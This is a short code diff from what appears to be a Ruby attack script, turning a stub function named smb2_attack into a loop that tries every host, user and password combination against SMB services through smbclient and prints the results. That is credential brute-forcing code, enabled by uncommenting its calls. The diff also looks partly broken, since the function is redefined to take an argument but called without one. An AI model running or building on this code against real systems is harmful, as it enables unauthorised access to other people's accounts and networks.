@@ -48,11 +48,18 @@ def create_lists(arg)
   puts @pass
 end
 
-def smb2_attack
-  out, err = @cmd.run!("@smbclient -u ", timeout: 0.5)
+def smb2_attack(arg)
+  @hosts.each do |host|
+    @users.each do |user|
+      @pass.each do |pass|
+        out, err = @cmd.run!("@smbclient #{arg[:domain]}/#{user}:#{pass}@#{host}")
+        puts out
+      end
+    end
+  end
 end
 
 arg = arguments
-# check_smbclient
+check_smbclient
 create_lists(arg)
-# smb2_attack
+smb2_attack
